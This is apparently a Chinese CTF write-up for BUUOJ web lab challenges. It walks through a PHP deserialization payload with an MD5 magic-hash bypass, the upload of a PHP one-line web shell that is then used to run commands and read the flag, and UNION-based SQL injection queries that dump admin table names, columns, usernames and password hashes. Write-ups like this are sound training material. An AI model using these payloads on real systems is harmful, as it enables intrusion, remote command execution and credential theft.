## **3.BUU CODE REVIEW 1**

访问url

http://18edd6f4-f2cd-4c9c-89a7-38c5cd491305.node3.buuoj.cn/

审查源码

```
<?php
/\*\*
 \* Created by PhpStorm.
 \* User: jinzhao
 \* Date: 2019/10/6
 \* Time: 8:04 PM
 \*/
highlight\_file(\_\_FILE\_\_);
class BUU {                        //类：BUU               
   public $correct \= "";           //公有属性：$correct
   public $input \= "";             //公有属性：$input
   public function \_\_destruct() {  //公有析构方法\_\_destruct()，在当前类的实例化对象销毁前，自动被调用
       try {
           $this\->correct \= base64\_encode(uniqid());      //给correct赋值为base64\_encode(uniqid()) //uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。
           if($this\->correct \=== $this\->input) {          //判断两个属性是否全等
               echo file\_get\_contents("/flag");           //若全等，则打印根目录下的flag
           }
       } catch (Exception $e) {
       }
   }
}
if($\_GET\['pleaseget'\] \=== '1') {          //GET方法传递pleaseget变量值为1
    if($\_POST\['pleasepost'\] \=== '2') {    //POST方法传递pleasepost变量值为2
        if(md5($\_POST\['md51'\]) \== md5($\_POST\['md52'\]) && $\_POST\['md51'\] != $\_POST\['md52'\]) {   //POST方法传递md51和md52的内容不同
但是md5值相同
            unserialize($\_POST\['obj'\]);
        }
    }
}
```

编写代码，构造payload

```
<?php
class BUU{
    public $correct\="";
    public $input\="";
}
$obj \= new BUU; 
$obj\->input\=&$obj\->correct; ////BUU类中的correct和input内容强相等，这里利用传引用的方法
echo serialize($obj);
?>
```

得到的字符串：

O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}

通过数组使用hackbar构造payload1

```
http://18edd6f4-f2cd-4c9c-89a7-38c5cd491305.node3.buuoj.cn/?pleaseget=1
pleasepost=2&md51\[\]=1&md52\[\]=2&obj=O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
```

如下

![](../Images/43c2347ebcb870db192d8736456d370b.png)

原理：PHP 当中使用== 来进行比较的时候，系统会自动处理数据类型， 进行分析是数字比较还是字符比较。 而当一个字符串值是0e开头的时候，那么就会被当成数值。而0exxxxxx都为0.

那么就只需要找到两个不同的数值，开头却是以e0开头的即可。如下图中所示。

![](../Images/84edc74b52b960d38f5734ce48be5972.png)

通过弱类型使用hackbar构造payload2

```
http://18edd6f4-f2cd-4c9c-89a7-38c5cd491305.node3.buuoj.cn/?pleaseget=1
pleasepost=2&md51=s1885207154a&md52=s155964671a&obj=O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
```

如下

![](../Images/924ce1bfd533cf3769d078152e44bcbc.png)

得到flag{e8db4533-5be4-4167-823c-99aa37dd11c3}

## **5.BUU UPLOAD COURSE 1**

访问url

http://744b8e7e-1960-4d5e-b864-0818361e1f50.node3.buuoj.cn/index.php?file=upload.php

这是一道上传一句话木马的题，有一个可以提交文件的页面

![](../Images/2bd3de1551a1ec20d68a69576bef3c0f.png)

写一个普通的 php 脚本，保存改后缀为 .php 尝试上传

```
<?php echo 'Hello World!'; ?>
```

页面提示

![](../Images/9c6f0adf8144f48bc94c43e2f2360160.png)

可以在 ?file=uploads/6078008f5d264.jpg 查看，有相应的内容回显，说明自定义的 php 脚本被成功执行

![](../Images/20fb81b6faa80a20a1a3260e49a63d50.png)

把脚本修改成一句话木马

```
<?php @eval(system($\_POST\["x"\]));?>
```

成功上传后

![](../Images/630cc3ec4f729e4cf40540176321f728.png)

访问相应的 ?file=uploads/60780125ea642.jpg，页面空白，说明 php 命令被成功执行

hackbar构造payload

```
http://744b8e7e-1960-4d5e-b864-0818361e1f50.node3.buuoj.cn/index.php?file=uploads/60780125ea642.jpg 
x=ls
```

成功拿到 shell

![](../Images/060b83da0403ea2a1a56e52e0a00e161.png)

提交 cat /flag 拿到 flag{75427571-4ee5-4f7c-b97a-b84ad969ca1f}

![](../Images/0b148be8b8674612efb09bf4e8ad83c6.png)

访问url

http://ab600305-c94f-49ad-9122-563513c0d4e1.node3.buuoj.cn/#/

首页如下

![](../Images/c6abadbabc5a72c7b3b5098d10fe0be2.png)

![](../Images/a3e59c8633971011b68e39d309b577a9.png)

?id=0 union select 1,group\_concat(table\_name) from information\_schema.tables where table\_schema=database()#

为admin,contents

![](../Images/5c3205ff7dfc5b94bfd84ea63f61084a.png)

```
?id=0 union select 1,group\_concat(column\_name) from information\_schema.columns where table\_name='admin' and table\_schema=database()#
```

为id，username，password

![](../Images/182942459df25fd52badf7aa6937b87d.png)

查询username，password的字段内容

?id=0 union select group\_concat(username),group\_concat(password) from admin#

为admin，5398f18f7e93f8e45f6ea31bc4105a2d

![](../Images/64d09fd1f0d6fa47a1ff08be1599797d.png)
